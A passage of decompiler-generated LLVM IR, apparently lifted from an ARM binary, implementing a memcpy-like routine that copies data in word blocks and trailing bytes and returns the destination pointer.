  %v8_124a0 = icmp slt i32 %v2_124a0, 0
  store i1 %v8_124a0, i1* %cpsr_n.global-to-local, align 1
  %v9_124a0 = icmp eq i32 %v0_124a0, %v1_124a0
  store i1 %v9_124a0, i1* @cpsr_z, align 1
  br i1 %v3_124a0, label %dec_label_pc_126ec, label %dec_label_pc_124a8

dec_label_pc_124a8:                               ; preds = %dec_label_pc_124a0
  br i1 %v9_124a0, label %.thread122, label %bb

.thread122:                                       ; preds = %bb145, %.thread121, %bb142, %dec_label_pc_124a8
  %merge = phi i32 [ %v0_124a0, %dec_label_pc_124a8 ], [ %v2_12780, %bb142 ], [ %v11_1279c, %bb145 ], [ %v7_1279c, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_124a8
  %v5_124ac = inttoptr i32 %v1_124a0 to i8*
  store i8* %v5_124ac, i8** %stack_var_-8, align 4
  %v0_124b0 = load i32, i32* @r2, align 4
  %v2_124b0 = add i32 %v0_124b0, -4
  store i32 %v2_124b0, i32* %r2.global-to-local, align 4
  %v4_124b0 = sub i32 3, %v0_124b0
  %v5_124b0 = and i32 %v4_124b0, %v0_124b0
  %v6_124b0 = icmp slt i32 %v5_124b0, 0
  store i1 %v6_124b0, i1* %cpsr_v.global-to-local, align 1
  %v7_124b0 = icmp slt i32 %v2_124b0, 0
  store i1 %v7_124b0, i1* %cpsr_n.global-to-local, align 1
  %v5_124b4 = icmp slt i32 %v0_124b0, 4
  br i1 %v5_124b4, label %bb132, label %dec_label_pc_124b8

dec_label_pc_124b8:                               ; preds = %bb
  %v1_124b8 = urem i32 %v1_124a0, 4
  store i32 %v1_124b8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_124b8 = icmp eq i32 %v1_124b8, 0
  br i1 %v2_124b8, label %dec_label_pc_124c0, label %dec_label_pc_12564

dec_label_pc_124c0:                               ; preds = %dec_label_pc_124b8
  %v1_124c0 = urem i32 %v0_124a0, 4
  store i32 %v1_124c0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_124c0 = icmp eq i32 %v1_124c0, 0
  %extract.t = trunc i32 %v0_124a0 to i2
  br i1 %v2_124c0, label %dec_label_pc_124c8, label %dec_label_pc_12594

dec_label_pc_124c8:                               ; preds = %dec_label_pc_124c0, %dec_label_pc_1258c
  %v0_124e092 = phi i32 [ %v1_124a0, %dec_label_pc_124c0 ], [ %v0_125dc75, %dec_label_pc_1258c ]
  %v0_124dc91 = phi i32 [ %v0_124a0, %dec_label_pc_124c0 ], [ %v0_1258c, %dec_label_pc_1258c ]
  %v0_124c8 = phi i32 [ %v2_124b0, %dec_label_pc_124c0 ], [ %v2_12584, %dec_label_pc_1258c ]
  %v2_124c8 = add i32 %v0_124c8, -8
  store i32 %v2_124c8, i32* %r2.global-to-local, align 4
  %v4_124c8 = sub i32 7, %v0_124c8
  %v5_124c8 = and i32 %v4_124c8, %v0_124c8
  %v6_124c8 = icmp slt i32 %v5_124c8, 0
  store i1 %v6_124c8, i1* %cpsr_v.global-to-local, align 1
  %v7_124c8 = icmp slt i32 %v2_124c8, 0
  store i1 %v7_124c8, i1* %cpsr_n.global-to-local, align 1
  %v5_124cc = icmp slt i32 %v0_124c8, 8
  br i1 %v5_124cc, label %dec_label_pc_1251c, label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %dec_label_pc_124c8
  %v2_124d0 = add i32 %v0_124c8, -28
  store i32 %v2_124d0, i32* %r2.global-to-local, align 4
  %v4_124d0 = sub i32 27, %v0_124c8
  %v5_124d0 = and i32 %v4_124d0, %v2_124c8
  %v6_124d0 = icmp slt i32 %v5_124d0, 0
  store i1 %v6_124d0, i1* %cpsr_v.global-to-local, align 1
  %v7_124d0 = icmp slt i32 %v2_124d0, 0
  store i1 %v7_124d0, i1* %cpsr_n.global-to-local, align 1
  %v5_124d4 = icmp slt i32 %v2_124c8, 20
  br i1 %v5_124d4, label %dec_label_pc_12508, label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %dec_label_pc_124d0
  %v0_124d8 = load i32, i32* @r4, align 4
  store i32 %v0_124d8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_124dc

dec_label_pc_124dc:                               ; preds = %dec_label_pc_124dc.dec_label_pc_124dc_crit_edge, %dec_label_pc_124d8
  %v0_124e0 = phi i32 [ %v12_124e8, %dec_label_pc_124dc.dec_label_pc_124dc_crit_edge ], [ %v0_124e092, %dec_label_pc_124d8 ]
  %v0_124dc = phi i32 [ %v0_124dc.pre, %dec_label_pc_124dc.dec_label_pc_124dc_crit_edge ], [ %v0_124dc91, %dec_label_pc_124d8 ]
  %v1_124dc = inttoptr i32 %v0_124dc to i32*
  %v2_124dc = load i32, i32* %v1_124dc, align 4
  store i32 %v2_124dc, i32* %r3.global-to-local, align 4
  %v3_124dc = add i32 %v0_124dc, 4
  %v4_124dc = inttoptr i32 %v3_124dc to i32*
  %v5_124dc = load i32, i32* %v4_124dc, align 4
  store i32 %v5_124dc, i32* %r4.global-to-local, align 4
  %v6_124dc = add i32 %v0_124dc, 8
  %v7_124dc = inttoptr i32 %v6_124dc to i32*
  %v8_124dc = load i32, i32* %v7_124dc, align 4
  store i32 %v8_124dc, i32* %ip.global-to-local, align 4
  %v9_124dc = add i32 %v0_124dc, 12
  %v10_124dc = inttoptr i32 %v9_124dc to i32*
  %v11_124dc = load i32, i32* %v10_124dc, align 4
  store i32 %v11_124dc, i32* %lr.global-to-local, align 4
  %v12_124dc = add i32 %v0_124dc, 16
  store i32 %v12_124dc, i32* %r1.global-to-local, align 4
  %v1_124e0 = inttoptr i32 %v0_124e0 to i32*
  store i32 %v2_124dc, i32* %v1_124e0, align 4
  %v3_124e0 = add i32 %v0_124e0, 4
  %v4_124e0 = inttoptr i32 %v3_124e0 to i32*
  %v5_124e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_124e0, i32* %v4_124e0, align 4
  %v6_124e0 = add i32 %v0_124e0, 8
  %v7_124e0 = inttoptr i32 %v6_124e0 to i32*
  %v8_124e0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_124e0, i32* %v7_124e0, align 4
  %v9_124e0 = add i32 %v0_124e0, 12
  %v10_124e0 = inttoptr i32 %v9_124e0 to i32*
  %v11_124e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_124e0, i32* %v10_124e0, align 4
  %v12_124e0 = add i32 %v0_124e0, 16
  store i32 %v12_124e0, i32* %r0.global-to-local, align 4
  %v0_124e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_124e4 = inttoptr i32 %v0_124e4 to i32*
  %v2_124e4 = load i32, i32* %v1_124e4, align 4
  store i32 %v2_124e4, i32* %r3.global-to-local, align 4
  %v3_124e4 = add i32 %v0_124e4, 4
  %v4_124e4 = inttoptr i32 %v3_124e4 to i32*
  %v5_124e4 = load i32, i32* %v4_124e4, align 4
  store i32 %v5_124e4, i32* %r4.global-to-local, align 4
  %v6_124e4 = add i32 %v0_124e4, 8
  %v7_124e4 = inttoptr i32 %v6_124e4 to i32*
  %v8_124e4 = load i32, i32* %v7_124e4, align 4
  store i32 %v8_124e4, i32* @ip, align 4
  %v9_124e4 = add i32 %v0_124e4, 12
  %v10_124e4 = inttoptr i32 %v9_124e4 to i32*
  %v11_124e4 = load i32, i32* %v10_124e4, align 4
  store i32 %v11_124e4, i32* @lr, align 4
  %v12_124e4 = add i32 %v0_124e4, 16
  store i32 %v12_124e4, i32* @r1, align 4
  %v1_124e8 = inttoptr i32 %v12_124e0 to i32*
  store i32 %v2_124e4, i32* %v1_124e8, align 4
  %v3_124e8 = add i32 %v0_124e0, 20
  %v4_124e8 = inttoptr i32 %v3_124e8 to i32*
  %v5_124e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_124e8, i32* %v4_124e8, align 4
  %v6_124e8 = add i32 %v0_124e0, 24
  %v7_124e8 = inttoptr i32 %v6_124e8 to i32*
  %v8_124e8 = load i32, i32* @ip, align 4
  store i32 %v8_124e8, i32* %v7_124e8, align 4
  %v9_124e8 = add i32 %v0_124e0, 28
  %v10_124e8 = inttoptr i32 %v9_124e8 to i32*
  %v11_124e8 = load i32, i32* @lr, align 4
  store i32 %v11_124e8, i32* %v10_124e8, align 4
  %v12_124e8 = add i32 %v0_124e0, 32
  store i32 %v12_124e8, i32* %r0.global-to-local, align 4
  %v0_124ec = load i32, i32* %r2.global-to-local, align 4
  %v2_124ec = add i32 %v0_124ec, -32
  store i32 %v2_124ec, i32* %r2.global-to-local, align 4
  %v6_124f0 = icmp slt i32 %v0_124ec, 32
  br i1 %v6_124f0, label %dec_label_pc_124f4, label %dec_label_pc_124dc.dec_label_pc_124dc_crit_edge

dec_label_pc_124dc.dec_label_pc_124dc_crit_edge:  ; preds = %dec_label_pc_124dc
  %v0_124dc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_124dc

dec_label_pc_124f4:                               ; preds = %dec_label_pc_124dc
  %v4_124f4 = add i32 %v0_124ec, -16
  %v6_124f4 = add i32 %v0_124ec, 2147483616
  %v7_124f4 = and i32 %v4_124f4, %v6_124f4
  %v8_124f4 = icmp slt i32 %v7_124f4, 0
  store i1 %v8_124f4, i1* %cpsr_v.global-to-local, align 1
  %v9_124f4 = icmp slt i32 %v4_124f4, 0
  store i1 %v9_124f4, i1* %cpsr_n.global-to-local, align 1
  %v5_124f8 = icmp slt i32 %v2_124ec, -16
  br i1 %v5_124f8, label %.thread1, label %bb129

bb129:                                            ; preds = %dec_label_pc_124f4
  %v6_124f8 = load i32, i32* @r1, align 4
  %v7_124f8 = inttoptr i32 %v6_124f8 to i32*
  %v8_124f8 = load i32, i32* %v7_124f8, align 4
  store i32 %v8_124f8, i32* %r3.global-to-local, align 4
  %v9_124f8 = add i32 %v6_124f8, 4
  %v10_124f8 = inttoptr i32 %v9_124f8 to i32*
  %v11_124f8 = load i32, i32* %v10_124f8, align 4
  store i32 %v11_124f8, i32* %r4.global-to-local, align 4
  %v12_124f8 = add i32 %v6_124f8, 8
  %v13_124f8 = inttoptr i32 %v12_124f8 to i32*
  %v14_124f8 = load i32, i32* %v13_124f8, align 4
  store i32 %v14_124f8, i32* @ip, align 4
  %v15_124f8 = add i32 %v6_124f8, 12
  %v16_124f8 = inttoptr i32 %v15_124f8 to i32*
  %v17_124f8 = load i32, i32* %v16_124f8, align 4
  store i32 %v17_124f8, i32* @lr, align 4
  %v18_124f8 = add i32 %v6_124f8, 16
  store i32 %v18_124f8, i32* @r1, align 4
  %v7_124fc = inttoptr i32 %v12_124e8 to i32*
  store i32 %v8_124f8, i32* %v7_124fc, align 4
  %v9_124fc = add i32 %v0_124e0, 36
  %v10_124fc = inttoptr i32 %v9_124fc to i32*
  %v11_124fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_124fc, i32* %v10_124fc, align 4
  %v12_124fc = add i32 %v0_124e0, 40
  %v13_124fc = inttoptr i32 %v12_124fc to i32*
  %v14_124fc = load i32, i32* @ip, align 4
  store i32 %v14_124fc, i32* %v13_124fc, align 4
  %v15_124fc = add i32 %v0_124e0, 44
  %v16_124fc = inttoptr i32 %v15_124fc to i32*
  %v17_124fc = load i32, i32* @lr, align 4
  store i32 %v17_124fc, i32* %v16_124fc, align 4
  %v18_124fc = add i32 %v0_124e0, 48
  store i32 %v18_124fc, i32* %r0.global-to-local, align 4
  %v6_12500 = load i32, i32* %r2.global-to-local, align 4
  %v7_12500 = add i32 %v6_12500, -16
  store i32 %v7_12500, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_124f4, %bb129
  %v3_12510101 = phi i32 [ %v12_124e8, %dec_label_pc_124f4 ], [ %v18_124fc, %bb129 ]
  %v0_1250895 = phi i32 [ %v2_124ec, %dec_label_pc_124f4 ], [ %v7_12500, %bb129 ]
  %v2_12504 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12504, i32* @r4, align 4
  br label %dec_label_pc_12508

dec_label_pc_12508:                               ; preds = %dec_label_pc_124d0, %.thread1
  %v3_12510100 = phi i32 [ %v0_124e092, %dec_label_pc_124d0 ], [ %v3_12510101, %.thread1 ]
  %v0_12508 = phi i32 [ %v2_124d0, %dec_label_pc_124d0 ], [ %v0_1250895, %.thread1 ]
  %v1_12508 = add i32 %v0_12508, 20
  store i32 %v1_12508, i32* %r2.global-to-local, align 4
  %v3_12508 = sub i32 0, %v0_12508
  %v4_12508 = and i32 %v1_12508, %v3_12508
  %v5_12508 = icmp slt i32 %v4_12508, 0
  store i1 %v5_12508, i1* %cpsr_v.global-to-local, align 1
  %v6_12508 = icmp slt i32 %v1_12508, 0
  store i1 %v6_12508, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1250c

dec_label_pc_1250c:                               ; preds = %.thread117, %dec_label_pc_12508
  %v0_1251c.pre148 = phi i32 [ %v0_1251c.pre, %.thread117 ], [ %v1_12508, %dec_label_pc_12508 ]
  %v3_12510 = phi i32 [ %v3_1251098118, %.thread117 ], [ %v3_12510100, %dec_label_pc_12508 ]
  %v1_12514 = phi i1 [ %v1_12518, %.thread117 ], [ %v5_12508, %dec_label_pc_12508 ]
  %v0_12514 = phi i1 [ %v0_12518, %.thread117 ], [ %v6_12508, %dec_label_pc_12508 ]
  %v2_1250c = xor i1 %v1_12514, %v0_12514
  br i1 %v2_1250c, label %.thread117, label %bb130

bb130:                                            ; preds = %dec_label_pc_1250c
  %v3_1250c = load i32, i32* @r1, align 4
  %v4_1250c = inttoptr i32 %v3_1250c to i32*
  %v5_1250c = load i32, i32* %v4_1250c, align 4
  store i32 %v5_1250c, i32* %r3.global-to-local, align 4
  %v6_1250c = add i32 %v3_1250c, 4
  %v7_1250c = inttoptr i32 %v6_1250c to i32*
  %v8_1250c = load i32, i32* %v7_1250c, align 4
  store i32 %v8_1250c, i32* @ip, align 4
  %v9_1250c = add i32 %v3_1250c, 8
  %v10_1250c = inttoptr i32 %v9_1250c to i32*
  %v11_1250c = load i32, i32* %v10_1250c, align 4
  store i32 %v11_1250c, i32* @lr, align 4
  %v12_1250c = add i32 %v3_1250c, 12
  store i32 %v12_1250c, i32* @r1, align 4
  %v4_12510 = inttoptr i32 %v3_12510 to i32*
  store i32 %v5_1250c, i32* %v4_12510, align 4
  %v6_12510 = add i32 %v3_12510, 4
  %v7_12510 = inttoptr i32 %v6_12510 to i32*
  %v8_12510 = load i32, i32* @ip, align 4
  store i32 %v8_12510, i32* %v7_12510, align 4
  %v9_12510 = add i32 %v3_12510, 8
  %v10_12510 = inttoptr i32 %v9_12510 to i32*
  %v11_12510 = load i32, i32* @lr, align 4
  store i32 %v11_12510, i32* %v10_12510, align 4
  %v12_12510 = add i32 %v3_12510, 12
  store i32 %v12_12510, i32* %r0.global-to-local, align 4
  %v3_12514 = load i32, i32* %r2.global-to-local, align 4
  %v4_12514 = add i32 %v3_12514, -12
  store i32 %v4_12514, i32* %r2.global-to-local, align 4
  %v6_12514 = sub i32 11, %v3_12514
  %v7_12514 = and i32 %v6_12514, %v3_12514
  %v8_12514 = icmp slt i32 %v7_12514, 0
  store i1 %v8_12514, i1* %cpsr_v.global-to-local, align 1
  %v9_12514 = icmp slt i32 %v4_12514, 0
  store i1 %v9_12514, i1* %cpsr_n.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_1250c, %bb130
  %v0_1251c.pre = phi i32 [ %v4_12514, %bb130 ], [ %v0_1251c.pre148, %dec_label_pc_1250c ]
  %v3_1251098118 = phi i32 [ %v12_12510, %bb130 ], [ %v3_12510, %dec_label_pc_1250c ]
  %v1_12518 = phi i1 [ %v8_12514, %bb130 ], [ %v1_12514, %dec_label_pc_1250c ]
  %v0_12518 = phi i1 [ %v9_12514, %bb130 ], [ %v0_12514, %dec_label_pc_1250c ]
  %v2_12518 = xor i1 %v1_12518, %v0_12518
  br i1 %v2_12518, label %dec_label_pc_1251c, label %dec_label_pc_1250c

dec_label_pc_1251c:                               ; preds = %.thread117, %dec_label_pc_124c8
  %v7_1252c = phi i32 [ %v0_124e092, %dec_label_pc_124c8 ], [ %v3_1251098118, %.thread117 ]
  %v0_1251c = phi i32 [ %v2_124c8, %dec_label_pc_124c8 ], [ %v0_1251c.pre, %.thread117 ]
  %v2_1251c = add i32 %v0_1251c, 8
  store i32 %v2_1251c, i32* %r2.global-to-local, align 4
  %v4_1251c = sub i32 0, %v0_1251c
  %v5_1251c = and i32 %v2_1251c, %v4_1251c
  %v6_1251c = icmp slt i32 %v5_1251c, 0
  store i1 %v6_1251c, i1* %cpsr_v.global-to-local, align 1
  %v7_1251c = icmp slt i32 %v2_1251c, 0
  store i1 %v7_1251c, i1* %cpsr_n.global-to-local, align 1
  %v5_12520 = icmp slt i32 %v0_1251c, -8
  br i1 %v5_12520, label %bb132, label %dec_label_pc_12524

dec_label_pc_12524:                               ; preds = %dec_label_pc_1251c
  %v6_12524 = add i32 %v0_1251c, 4
  store i32 %v6_12524, i32* %r2.global-to-local, align 4
  %v8_12524 = sub i32 -5, %v0_1251c
  %v9_12524 = and i32 %v8_12524, %v2_1251c
  %v10_12524 = icmp slt i32 %v9_12524, 0
  store i1 %v10_12524, i1* %cpsr_v.global-to-local, align 1
  %v11_12524 = icmp slt i32 %v6_12524, 0
  store i1 %v11_12524, i1* %cpsr_n.global-to-local, align 1
  %v5_12528 = icmp slt i32 %v2_1251c, 4
  %v6_12528 = load i32, i32* @r1, align 4
  %v7_12528 = inttoptr i32 %v6_12528 to i32*
  %v8_12528 = load i32, i32* %v7_12528, align 4
  store i32 %v8_12528, i32* %r3.global-to-local, align 4
  %v10_12528 = add i32 %v6_12528, 4
  br i1 %v5_12528, label %.thread5, label %bb131

.thread5:                                         ; preds = %dec_label_pc_12524
  store i32 %v10_12528, i32* @r1, align 4
  %v8_1252c = inttoptr i32 %v7_1252c to i32*
  store i32 %v8_12528, i32* %v8_1252c, align 4
  %v9_1252c = load i32, i32* %r0.global-to-local, align 4
  %v10_1252c = add i32 %v9_1252c, 4
  store i32 %v10_1252c, i32* %r0.global-to-local, align 4
  %v0_1253c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb132

bb131:                                            ; preds = %dec_label_pc_12524
  %v10_12530 = inttoptr i32 %v10_12528 to i32*
  %v11_12530 = load i32, i32* %v10_12530, align 4
  store i32 %v11_12530, i32* @ip, align 4
  %v12_12530 = add i32 %v6_12528, 8
  store i32 %v12_12530, i32* @r1, align 4
  %v7_12534 = inttoptr i32 %v7_1252c to i32*
  store i32 %v8_12528, i32* %v7_12534, align 4
  %v9_12534 = add i32 %v7_1252c, 4
  %v10_12534 = inttoptr i32 %v9_12534 to i32*
  %v11_12534 = load i32, i32* @ip, align 4
  store i32 %v11_12534, i32* %v10_12534, align 4
  %v12_12534 = add i32 %v7_1252c, 8
  store i32 %v12_12534, i32* %r0.global-to-local, align 4
  %v6_12538 = load i32, i32* %r2.global-to-local, align 4
  %v7_12538 = add i32 %v6_12538, -4
  store i32 %v7_12538, i32* %r2.global-to-local, align 4
  br label %bb132

bb132:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_1251c, %bb, %dec_label_pc_12678, %dec_label_pc_1260c, %dec_label_pc_126e4, %bb131
  %v2_1254c = phi i32 [ %v10_1252c, %.thread5 ], [ %v0_125dc75, %.thread11 ], [ %v7_1252c, %dec_label_pc_1251c ], [ %v1_124a0, %bb ], [ %v2_1254c113, %dec_label_pc_12678 ], [ %v2_1254c112, %dec_label_pc_1260c ], [ %v2_1254c111, %dec_label_pc_126e4 ], [ %v12_12534, %bb131 ]
  %v0_1253c = phi i32 [ %v0_1253c.pre, %.thread5 ], [ %v2_12584, %.thread11 ], [ %v2_1251c, %dec_label_pc_1251c ], [ %v2_124b0, %bb ], [ %v0_1253c109, %dec_label_pc_12678 ], [ %v0_1253c108, %dec_label_pc_1260c ], [ %v0_1253c107, %dec_label_pc_126e4 ], [ %v7_12538, %bb131 ]
  %v1_1253c = add i32 %v0_1253c, 4
  store i32 %v1_1253c, i32* @r2, align 4
  %v3_1253c = sub i32 0, %v0_1253c
  %v4_1253c = and i32 %v1_1253c, %v3_1253c
  %v5_1253c = icmp slt i32 %v4_1253c, 0
  store i1 %v5_1253c, i1* %cpsr_v.global-to-local, align 1
  %v6_1253c = icmp slt i32 %v1_1253c, 0
  store i1 %v6_1253c, i1* %cpsr_n.global-to-local, align 1
  %v7_1253c = icmp eq i32 %v1_1253c, 0
  store i1 %v7_1253c, i1* @cpsr_z, align 1
  br i1 %v7_1253c, label %bb133, label %bb134

bb133:                                            ; preds = %bb132
  %v3_12540 = load i8*, i8** %stack_var_-8, align 4
  %v4_12540 = ptrtoint i8* %v3_12540 to i32
  store i32 %v4_12540, i32* %r0.global-to-local, align 4
  ret i32 %v4_12540

bb134:                                            ; preds = %bb132
  %v1_12544 = add i32 %v0_1253c, 2
  %v3_12544 = sub i32 -3, %v0_1253c
  %v4_12544 = and i32 %v3_12544, %v1_1253c
  %v5_12544 = icmp slt i32 %v4_12544, 0
  store i1 %v5_12544, i1* %cpsr_v.global-to-local, align 1
  %v6_12544 = icmp slt i32 %v1_12544, 0
  store i1 %v6_12544, i1* %cpsr_n.global-to-local, align 1
  %v7_12544 = icmp eq i32 %v1_1253c, 2
  store i1 %v7_12544, i1* @cpsr_z, align 1
  %v0_12548 = load i32, i32* @r1, align 4
  %v1_12548 = inttoptr i32 %v0_12548 to i8*
  %v2_12548 = load i8, i8* %v1_12548, align 1
  %v3_12548 = zext i8 %v2_12548 to i32
  store i32 %v3_12548, i32* %r3.global-to-local, align 4
  %v5_12548 = add i32 %v0_12548, 1
  store i32 %v5_12548, i32* @r1, align 4
  %v3_1254c = inttoptr i32 %v2_1254c to i8*
  store i8 %v2_12548, i8* %v3_1254c, align 1
  %v4_1254c = load i32, i32* %r0.global-to-local, align 4
  %v5_1254c = add i32 %v4_1254c, 1
  store i32 %v5_1254c, i32* %r0.global-to-local, align 4
  %v0_12550 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_12550 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_12550 = xor i1 %v0_12550, %v1_12550
  br i1 %v2_12550, label %.thread119, label %bb135

bb135:                                            ; preds = %bb134
  %v3_12550 = load i32, i32* @r1, align 4
  %v4_12550 = inttoptr i32 %v3_12550 to i8*
  %v5_12550 = load i8, i8* %v4_12550, align 1
  %v6_12550 = zext i8 %v5_12550 to i32
  store i32 %v6_12550, i32* %r3.global-to-local, align 4
  %v8_12550 = add i32 %v3_12550, 1
  store i32 %v8_12550, i32* @r1, align 4
  %v6_12554 = inttoptr i32 %v5_1254c to i8*
  store i8 %v5_12550, i8* %v6_12554, align 1
  %v7_12554 = load i32, i32* %r0.global-to-local, align 4
  %v8_12554 = add i32 %v7_12554, 1
  store i32 %v8_12554, i32* %r0.global-to-local, align 4
  %v1_12558.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_12558.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb134, %bb135
  %v7_1255c = phi i32 [ %v8_12554, %bb135 ], [ %v5_1254c, %bb134 ]
  %v2_1255c = phi i1 [ %v2_12558.pre, %bb135 ], [ %v1_12550, %bb134 ]
  %v1_1255c = phi i1 [ %v1_12558.pre, %bb135 ], [ %v0_12550, %bb134 ]
  %v0_12558 = load i1, i1* @cpsr_z, align 1
  %v3_12558 = xor i1 %v2_1255c, %v1_1255c
  %v4_12558 = or i1 %v0_12558, %v3_12558
  br i1 %v4_12558, label %.thread120, label %bb136

bb136:                                            ; preds = %.thread119
  %v5_12558 = load i32, i32* @r1, align 4
  %v6_12558 = inttoptr i32 %v5_12558 to i8*
  %v7_12558 = load i8, i8* %v6_12558, align 1
  %v8_12558 = zext i8 %v7_12558 to i32
  store i32 %v8_12558, i32* %r3.global-to-local, align 4
  %v10_12558 = add i32 %v5_12558, 1
  store i32 %v10_12558, i32* @r1, align 4
  %v8_1255c = inttoptr i32 %v7_1255c to i8*
  store i8 %v7_12558, i8* %v8_1255c, align 1
  %v9_1255c = load i32, i32* %r0.global-to-local, align 4
  %v10_1255c = add i32 %v9_1255c, 1
  store i32 %v10_1255c, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb136
  %v2_12560 = load i8*, i8** %stack_var_-8, align 4
  %v3_12560 = ptrtoint i8* %v2_12560 to i32
  store i32 %v3_12560, i32* %r0.global-to-local, align 4
  ret i32 %v3_12560

dec_label_pc_12564:                               ; preds = %dec_label_pc_124b8
  %v1_12564 = sub nsw i32 4, %v1_124b8
  store i32 %v1_12564, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_12568 = icmp ult i32 %v1_12564, 2
  store i1 %v8_12568, i1* %cpsr_n.global-to-local, align 1
  %v1_1256c = inttoptr i32 %v0_124a0 to i8*
  %v2_1256c = load i8, i8* %v1_1256c, align 1
  %v3_1256c = zext i8 %v2_1256c to i32
  store i32 %v3_1256c, i32* %r3.global-to-local, align 4
  %v5_1256c = add i32 %v0_124a0, 1
  store i32 %v5_1256c, i32* @r1, align 4
  store i8 %v2_1256c, i8* %v5_124ac, align 1
  %v4_12570 = load i32, i32* %r0.global-to-local, align 4
  %v5_12570 = add i32 %v4_12570, 1
  store i32 %v5_12570, i32* %r0.global-to-local, align 4
  br i1 %v8_12568, label %.thread11, label %bb137

bb137:                                            ; preds = %dec_label_pc_12564
  %v9_12568 = icmp eq i32 %v1_12564, 2
  %v6_12574 = load i32, i32* @r1, align 4
  %v7_12574 = inttoptr i32 %v6_12574 to i8*
  %v8_12574 = load i8, i8* %v7_12574, align 1
  %v9_12574 = zext i8 %v8_12574 to i32
  store i32 %v9_12574, i32* %r3.global-to-local, align 4
  %v11_12574 = add i32 %v6_12574, 1
  store i32 %v11_12574, i32* @r1, align 4
  %v9_12578 = inttoptr i32 %v5_12570 to i8*
  store i8 %v8_12574, i8* %v9_12578, align 1
  %v10_12578 = load i32, i32* %r0.global-to-local, align 4
  %v11_12578 = add i32 %v10_12578, 1
  store i32 %v11_12578, i32* %r0.global-to-local, align 4
  br i1 %v9_12568, label %.thread11, label %bb138

bb138:                                            ; preds = %bb137
  %v8_1257c = load i32, i32* @r1, align 4
  %v9_1257c = inttoptr i32 %v8_1257c to i8*
  %v10_1257c = load i8, i8* %v9_1257c, align 1
  %v11_1257c = zext i8 %v10_1257c to i32
  store i32 %v11_1257c, i32* %r3.global-to-local, align 4
  %v13_1257c = add i32 %v8_1257c, 1
  store i32 %v13_1257c, i32* @r1, align 4
  %v11_12580 = inttoptr i32 %v11_12578 to i8*
  store i8 %v10_1257c, i8* %v11_12580, align 1
  %v12_12580 = load i32, i32* %r0.global-to-local, align 4
  %v13_12580 = add i32 %v12_12580, 1
  store i32 %v13_12580, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb137, %dec_label_pc_12564, %bb138
  %v0_125dc75 = phi i32 [ %v11_12578, %bb137 ], [ %v5_12570, %dec_label_pc_12564 ], [ %v13_12580, %bb138 ]
  %v0_12584 = load i32, i32* %r2.global-to-local, align 4
  %v1_12584 = load i32, i32* @ip, align 4
  %v2_12584 = sub i32 %v0_12584, %v1_12584
  store i32 %v2_12584, i32* %r2.global-to-local, align 4
  %v4_12584 = xor i32 %v1_12584, %v0_12584
  %v5_12584 = xor i32 %v2_12584, %v0_12584
  %v6_12584 = and i32 %v5_12584, %v4_12584
  %v7_12584 = icmp slt i32 %v6_12584, 0
  store i1 %v7_12584, i1* %cpsr_v.global-to-local, align 1
  %v8_12584 = icmp slt i32 %v2_12584, 0
  store i1 %v8_12584, i1* %cpsr_n.global-to-local, align 1
  %v5_12588 = icmp slt i32 %v0_12584, %v1_12584
  br i1 %v5_12588, label %bb132, label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %.thread11
  %v0_1258c = load i32, i32* @r1, align 4
  %v1_1258c = urem i32 %v0_1258c, 4
  store i32 %v1_1258c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1258c = icmp eq i32 %v1_1258c, 0
  %extract.t123 = trunc i32 %v0_1258c to i2
  br i1 %v2_1258c, label %dec_label_pc_124c8, label %dec_label_pc_12594

dec_label_pc_12594:                               ; preds = %dec_label_pc_124c0, %dec_label_pc_1258c
  %v0_125dc74 = phi i32 [ %v1_124a0, %dec_label_pc_124c0 ], [ %v0_125dc75, %dec_label_pc_1258c ]
  %v0_12688 = phi i32 [ %v2_124b0, %dec_label_pc_124c0 ], [ %v2_12584, %dec_label_pc_1258c ]
  %v0_1259c.off0 = phi i2 [ %extract.t, %dec_label_pc_124c0 ], [ %extract.t123, %dec_label_pc_1258c ]
  %v0_12594 = phi i32 [ %v0_124a0, %dec_label_pc_124c0 ], [ %v0_1258c, %dec_label_pc_1258c ]
  %v1_12594 = and i32 %v0_12594, -4
  store i32 %v1_12594, i32* %r1.global-to-local, align 4
  %v1_12598 = inttoptr i32 %v1_12594 to i32*
  %v2_12598 = load i32, i32* %v1_12598, align 4
  store i32 %v2_12598, i32* @lr, align 4
  %v4_12598 = add i32 %v1_12594, 4
  store i32 %v4_12598, i32* %r1.global-to-local, align 4
  %v2_12680 = add i32 %v0_12688, -12
  %v4_12680 = sub i32 11, %v0_12688
  %v5_12680 = and i32 %v4_12680, %v0_12688
  %v6_12680 = icmp slt i32 %v5_12680, 0
  store i1 %v6_12680, i1* %cpsr_v.global-to-local, align 1
  %v7_12680 = icmp slt i32 %v2_12680, 0
  store i1 %v7_12680, i1* %cpsr_n.global-to-local, align 1
